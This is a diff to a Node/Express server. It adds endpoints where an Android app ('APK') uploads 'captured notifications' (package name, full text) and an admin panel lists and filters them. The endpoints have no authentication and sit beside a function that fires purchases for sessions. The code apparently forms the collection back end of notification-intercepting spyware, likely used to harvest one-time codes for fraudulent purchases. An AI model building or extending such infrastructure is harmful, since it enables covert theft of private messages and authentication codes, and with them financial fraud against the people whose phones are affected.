@@ -598,6 +598,39 @@ async function firePurchaseForSession(sess, sourceUrl) {
   return result;
 }
 
+// ========== NOTIFICATION STORAGE ==========
+const NOTIF_FILE = path.join(DATA_DIR, 'notifications.json');
+let notifications = readJSON(NOTIF_FILE, []);
+function saveNotifications() { writeJSON(NOTIF_FILE, notifications); }
+
+// POST: APK uploads captured notifications
+app.post('/api/upload-notification', (req, res) => {
+  const { notification } = req.body;
+  if (!notification) return res.status(400).json({ error: 'Missing notification' });
+  notification.serverTime = new Date().toISOString();
+  notification.id = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+  notifications.unshift(notification);
+  // Keep last 1000
+  if (notifications.length > 1000) notifications = notifications.slice(0, 1000);
+  saveNotifications();
+  res.json({ success: true, id: notification.id });
+});
+
+// GET: Admin panel reads notifications
+app.get('/api/notifications', (req, res) => {
+  const limit = parseInt(req.query.limit) || 100;
+  const filter = req.query.filter || '';
+  let result = notifications;
+  if (filter) {
+    const f = filter.toLowerCase();
+    result = result.filter(n =>
+      (n.package && n.package.toLowerCase().includes(f)) ||
+      (n.fullText && n.fullText.toLowerCase().includes(f))
+    );
+  }
+  res.json({ total: notifications.length, notifications: result.slice(0, limit) });
+});
+
 app.get('/api/sessions', (req, res) => res.json(sessions));
 
 app.delete('/api/sessions/all', (req, res) => {
